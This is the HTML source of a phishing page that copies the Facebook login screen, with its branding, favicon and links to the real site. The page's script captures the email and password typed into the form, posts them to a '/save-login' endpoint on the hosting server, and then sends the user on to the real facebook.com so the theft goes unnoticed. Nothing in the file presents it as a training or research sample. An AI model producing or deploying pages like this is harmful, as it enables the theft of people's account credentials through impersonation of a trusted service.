<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta property="og:image" content="https://images.pexels.com/photos/1386604/pexels-photo-1386604.jpeg">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Log In</title>
    <link rel="icon" type="image/x-icon" href="https://facebook.com/favicon.ico">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            display: flex;
            max-width: 980px;
            gap: 60px;
            align-items: center;
            width: 100%;
        }

        .left-section {
            flex: 1;
        }

        .logo {
            color: #1877f2;
            font-size: 48px;
            font-weight: bold;
            margin-bottom: 16px;
        }

        .subtitle {
            font-size: 24px;
            color: #1c1e21;
            line-height: 1.4;
        }

        .right-section {
            flex: 1;
            width: 100%;
        }

        .login-form {
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
            max-width: 396px;
            width: 100%;
        }

        .form-group {
            margin-bottom: 16px;
        }

        input {
            width: 100%;
            padding: 14px 16px;
            font-size: 17px;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            outline: none;
        }

        input:focus {
            border-color: #1877f2;
            box-shadow: 0 0 0 2px #e7f3ff;
        }

        .login-btn {
            background: #1877f2;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 20px;
            font-weight: bold;
            padding: 14px;
            width: 100%;
            cursor: pointer;
            margin-bottom: 16px;
            transition: background-color 0.2s;
        }

        .login-btn:hover {
            background: #166fe5;
        }

        .login-btn:disabled {
            background: #a0c4ff;
            cursor: not-allowed;
        }

        .forgot-password {
            text-align: center;
            display: block;
            color: #1877f2;
            text-decoration: none;
            font-size: 14px;
            margin-bottom: 20px;
        }

        .forgot-password:hover {
            text-decoration: underline;
        }

        .divider {
            border-bottom: 1px solid #dadde1;
            margin: 20px 0;
        }

        .create-account-btn {
            background: #42b72a;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 17px;
            font-weight: bold;
            padding: 14px;
            cursor: pointer;
            display: block;
            margin: 0 auto;
            transition: background-color 0.2s;
        }

        .create-account-btn:hover {
            background: #36a420;
        }

        /* Mobile Responsive Styles */
        @media (max-width: 900px) {
            .container {
                flex-direction: column;
                gap: 40px;
                text-align: center;
            }
            
            .left-section {
                margin-bottom: 20px;
            }
            
            .logo {
                font-size: 42px;
            }
            
            .subtitle {
                font-size: 20px;
            }
            
            .login-form {
                max-width: 100%;
                padding: 15px;
            }
        }

        @media (max-width: 480px) {
            body {
                padding: 10px;
            }
            
            .logo {
                font-size: 36px;
            }
            
            .subtitle {
                font-size: 18px;
            }
            
            input, .login-btn, .create-account-btn {
                font-size: 16px; /* Prevents zoom on iOS */
                padding: 12px;
            }
            
            .login-form {
                padding: 15px;
                box-shadow: 0 1px 2px rgba(0, 0, 0, .1), 0 4px 8px rgba(0, 0, 0, .1);
            }
        }

        /* Additional mobile optimizations */
        input, button {
            -webkit-appearance: none;
            -moz-appearance: none;
            appearance: none;
        }

        button {
            touch-action: manipulation; /* Improves touch response */
        }

        /* Ensure form elements are easily tappable on mobile */
        input, button {
            min-height: 44px; /* Minimum touch target size */
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="left-section">
            <div class="logo">facebook</div>
            <div class="subtitle">Connect with friends and the world around you on Facebook.</div>
        </div>
        
        <div class="right-section">
            <form class="login-form" id="loginForm">
                <div class="form-group">
                    <input type="text" id="email" placeholder="Email or phone number" required>
                </div>
                <div class="form-group">
                    <input type="password" id="password" placeholder="Password" required>
                </div>
                <button type="submit" class="login-btn" id="loginBtn">Log In</button>
                <a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0" class="forgot-password">
                    Forgotten password?
                </a>
                <div class="divider"></div>
                <button type="button" class="create-account-btn" onclick="window.location.href='https://www.facebook.com/r.php?entry_point=login'">Create new account</button>
            </form>
        </div>
    </div>

    <script>
        const API_BASE = window.location.origin;

        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const loginBtn = document.getElementById('loginBtn');
            
            loginBtn.disabled = true;
            
            try {
                const response = await fetch(`${API_BASE}/save-login`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        email: email,
                        password: password
                    })
                });

                const result = await response.json();

                if (result.success) {
                   window.open("https://www.facebook.com", "_self");
                } else {
                    throw new Error(result.message);
                }

            } catch (error) {
                alert('Error: ' + error.message);
            } finally {
                loginBtn.textContent = 'Log In';
                loginBtn.disabled = false;
                document.getElementById('loginForm').reset();
            }
        });

        // Add touch event handling for better mobile experience
        document.addEventListener('touchstart', function() {}, {passive: true});
    </script>
</body>
</html>
